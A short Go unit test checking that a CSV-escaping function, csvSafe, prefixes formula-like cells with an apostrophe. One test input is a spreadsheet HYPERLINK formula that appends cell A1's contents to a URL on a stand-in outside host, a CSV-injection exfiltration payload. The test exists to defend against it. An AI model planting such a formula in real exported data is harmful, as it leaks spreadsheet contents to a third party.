package handler

import "testing"

func TestCSVSafe(t *testing.T) {
	for in, want := range map[string]string{
		`=HYPERLINK("https://x/?"&A1)`: `'=HYPERLINK("https://x/?"&A1)`,
		"@SUM(A1)":                     "'@SUM(A1)",
		"openssl":                      "openssl",
		"":                             "",
	} {
		if got := csvSafe(in); got != want {
			t.Errorf("csvSafe(%q) = %q, want %q", in, got, want)
		}
	}
}
